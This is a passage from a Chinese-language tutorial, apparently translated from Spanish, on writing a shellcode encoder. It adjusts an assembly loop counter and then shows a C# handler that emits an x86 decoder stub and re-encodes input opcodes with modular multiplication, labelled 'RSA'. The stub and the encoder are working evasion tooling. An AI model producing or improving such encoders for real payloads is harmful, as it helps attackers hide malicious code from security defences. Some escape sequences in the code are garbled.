    mov cx,376
    sub cx,1
做出这一改变后，这便是我们在堆栈中的新位置：
重要的一行是：
    00000009 66B978018A44      mov ecx,0x448a0178
其中可以看出，值378以32位格式成功分配。这样，密码程序已经能够处理大shellcode，字符多达32位许可证。
**加密程序**
对于加密程序的实现，我们选择了C＃.NET，因为其具有可移植性且代码易于理解，这方便算法的解释。对于程序的阐述，我们不提供所有代码，而是将展示和解释加密的重要部分。
该程序在主表单的2个类中执行，主类负责加密、读取和操作码结束的暴露，另一个类只负责获取十六进制数。负责转换为十六进制的类如下所示：
其是一个小类，已声明为静态，以便随时访问ToHexString方法，此方法执行到十六进制的转换，并返回作为类型字符串转换的数字。这是程序的核心，加密和最终链在此完成：
    private void button1_Click(object sender, EventArgs e)
    {
    string[] cShellcode = { "\xEB", "\x1C", "\x5E", "\x31", "\xC9", "\x31", "\xC0",
    "\x31", "\xDB", "\xB1", "\x00", "\x8A", "\x44", "\x0E", "\xFF", "\xB3", "\xAB", "\xF6",
    "\xE3", "\x88", "\x44", "\x0E", "\xFF", "\x80", "\xE9", "\x01", "\x75", "\xEF", "\xEB",
    "\x05", "\xE8", "\xDF", "\xFF", "\xFF", "\xFF" };
    richTextBox2.Clear();
    string [] separadores = { "/x","\x" };
    string shellcodeOri = richTextBox1.Text.Replace(""","");
    string[] opcodes = shellcodeOri.Split(separadores,
    System.StringSplitOptions.RemoveEmptyEntries);
    string[] opcodesInterno=new string[opcodes.Length];
    decimal tamShellcode = (decimal)(opcodes.Length + 25);
    cShellcode[10] = "\x" + tamShellcode.ToHexString().ToString();
    int contador = 0;
    int contador1 = 0;
    int contador2 = 0;
    if (cifrador == 1)
    {
    richTextBox2.Text = "//************RSA DECODER************" + "n";
    foreach (string j in cShellcode)
    {
    if (contador1 == 10)
    {
    richTextBox2.Text += "n";
    contador1 = 0;
    }
    richTextBox2.Text += j;
    contador1++;
    }
    richTextBox2.Text += "n//********ENCODED SHELLCODE*********" + "n";
    }
    foreach (string s in opcodes)
    {
    //MessageBox.Show(System.Convert.ToDecimal(s).ToString());
    try
    {
    decimal opc = int.Parse(s, System.Globalization.NumberStyles.HexNumber) *
    usePrime; // System.Convert.ToDecimal(s) * 3;
    opc = opc % useModule;
    var hex = opc.ToHexString();
    if (hex.ToString().Length == 1)
    {
    opcodesInterno[contador] = "\x0" + hex.ToString();
    }
    else
    {
    opcodesInterno[contador] = "\x" + hex.ToString();
    }
    //MessageBox.Show(opcodesInterno[contador]);
    contador++;
    }
    catch (Exception ex) { MessageBox.Show(ex.ToString()); }
    }
    foreach (string s2 in opcodesInterno)
    {
    try
    {
    if (contador2 == 10)
    {
    richTextBox2.Text += "n";
    contador2 = 0;
    }
    richTextBox2.Text += s2.ToString();
    contador2++;
    }
    catch { MessageBox.Show("Formato de Opcodes Incorrecto"); }
    }
    textBox1.Text = opcodes.Length.ToString();
    textBox2.Text = opcodesInterno.Length.ToString();
    Array.Clear(opcodes, 0, opcodes.Length);
    Array.Clear(opcodesInterno, 0, opcodesInterno.Length);
    decimal temp = (decimal)usePrime;
    textBox3.Text = "DEC: "+usePrime.ToString() + "|| HEX:" +
    temp.ToHexString().ToString(); ;
    textBox5.Text = useModule.ToString();
    }
首先，我们声明一个表示加密算法的字符串变量，还声明了分隔符的排列，这些分隔符随后将用于清除在RichBox类型的组件中输入的链。读取此组件并清除表示要加密的操作码的初始字符串：